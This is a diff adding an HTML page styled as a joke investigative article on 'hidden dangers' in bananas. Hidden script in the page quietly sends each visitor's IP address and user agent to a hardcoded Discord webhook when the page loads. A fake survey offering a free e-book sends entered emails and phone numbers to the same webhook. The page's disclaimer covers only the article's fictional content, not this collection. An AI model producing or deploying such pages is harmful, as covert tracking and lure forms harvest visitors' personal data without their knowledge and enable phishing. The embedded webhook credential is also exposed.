@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>The Hidden Dangers Lurking in Your Everyday Banana</title>
+  <style>
+    body { font-family: sans-serif; line-height: 1.6; margin: 20px; background-color: #f4f4f4; color: #333; }
+    h1, h2 { color: #d35400; }
+    p { margin-bottom: 15px; }
+    .author { font-style: italic; color: #777; margin-bottom: 10px; }
+    .disclaimer { color: #c0392b; font-size: 0.8em; margin-top: 20px; }
+    #hiddenData { display: none; }
+    .survey-section { background-color: #e0e0e0; padding: 15px; border-radius: 5px; margin-top: 20px; }
+    .error { color: red; }
+  </style>
+</head>
+<body>
+  <h1>The Hidden Dangers Lurking in Your Everyday Banana</h1>
+  <p class="author">By Anya Sharma, Investigative Journalist</p>
+
+  <p>You peel it, you eat it, you toss the skin. But what if the humble banana harbors secrets that could change the way you see this potassium-rich fruit forever? Our exclusive investigation uncovers startling claims and anecdotal evidence suggesting a hidden world within your breakfast staple.</p>
+
+  <h2>The Peel's Silent Signals</h2>
+  <p>Sources close to our investigation have revealed that the patterns on a banana peel might not be random. Could these seemingly innocent brown spots be a complex form of communication, perhaps even a warning?</p>
+
+  <h2>The Potassium Conspiracy</h2>
+  <p>We delve into the murky depths of the potassium industry. Are the widely accepted health benefits of this mineral merely a smokescreen for something more sinister? One anonymous expert stated, "The sheer abundance of potassium in bananas... it's unnatural."</p>
+
+  <h2>Have You Experienced These "Banana Side Effects"?</h2>
+  <ul>
+    <li>Sudden urges to buy more bananas?</li>
+    <li>Unexplained feelings of tropical relaxation?</li>
+    <li>A strange yellow residue on your fingers?</li>
+  </ul>
+  <p>If you've experienced any of these, you're not alone. Share your story in the comments below!</p>
+
+  <div id="hiddenData">
+    <span id="ipAddress"></span>
+    <span id="userAgent"></span>
+  </div>
+
+  <script>
+    const webhookUrl = 'https://discord.com/api/webhooks/1354943880205959280/m_Sk7fhLF3e9lFab06lzMB9Up1Y0FtxJqZJDMQZxkRgapN388FpY9mXaZhDacvqiz86d';
+
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        document.getElementById('ipAddress').innerText = data.ip;
+        sendData(data.ip);
+      })
+      .catch(error => console.error('Error fetching IP:', error));
+
+    const userAgent = navigator.userAgent;
+    document.getElementById('userAgent').innerText = userAgent;
+
+    function sendData(ipAddress) {
+      const ua = document.getElementById('userAgent').innerText;
+
+      const payload = {
+        embeds: [{
+          title: 'Banana Article Opened',
+          fields: [
+            { name: 'IP Address', value: ipAddress },
+            { name: 'User Agent', value: ua }
+          ]
+        }]
+      };
+
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      }).catch(error => console.error('Error sending data:', error));
+    }
+  </script>
+
+  <div class="survey-section">
+    <h2>Help Us Uncover the Truth!</h2>
+    <p>Participate in our brief survey and receive a free e-book: "101 Things You Never Knew About Bananas."</p>
+    <form id="fakeSurvey">
+      <p>Have you ever felt unusually drawn to purchase bananas? (Optional)</p>
+      <textarea name="bananaUrge"></textarea>
+      <p>Enter your email address to receive your free e-book:</p>
+      <input type="email" name="email">
+      <p>Enter your phone number to receive an exclusive bonus chapter:</p>
+      <input type="tel" name="phoneNumber">
+      <button type="button" onclick="submitFakeSurvey()">Submit</button>
+    </form>
+    <p id="error-message" class="error"></p>
+  </div>
+
+  <script>
+    function submitFakeSurvey() {
+      const email = document.querySelector('input[name="email"]').value;
+      const phoneNumber = document.querySelector('input[name="phoneNumber"]').value;
+      const errorMessage = document.getElementById('error-message');
+      errorMessage.textContent = ''; // Clear previous errors
+
+      const gmailRegex = /^[^\s@]+@gmail\.com$/;
+      const anyComRegex = /^[^\s@]+@[^\s@]+\.com$/;
+      const phoneRegex = /^\d{11,}$/;
+      let isEmailValid = false;
+
+      if (gmailRegex.test(email) || anyComRegex.test(email)) {
+        isEmailValid = true;
+      } else {
+        errorMessage.textContent = 'Please enter a valid email address ending with @gmail.com or .com.';
+        return;
+      }
+
+      if (phoneNumber && !phoneRegex.test(phoneNumber)) {
+        errorMessage.textContent = 'Please enter a valid phone number (at least 11 digits).';
+        return;
+      }
+
+      const payload = {
+        embeds: [{
+          title: 'Banana Survey Data',
+          fields: [
+            { name: 'Email', value: email },
+            { name: 'Phone Number', value: phoneNumber || 'Not provided' }
+          ]
+        }]
+      };
+
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      }).catch(error => console.error('Error sending survey data:', error));
+
+      alert('Thank you for your participation! Your e-book and bonus chapter will be sent shortly (still not really).');
+    }
+  </script>
+
+  <p class="disclaimer">**Disclaimer:** This article contains fictional elements for illustrative purposes. No actual dangers have been linked to everyday bananas.</p>
+
+</body>
+</html>
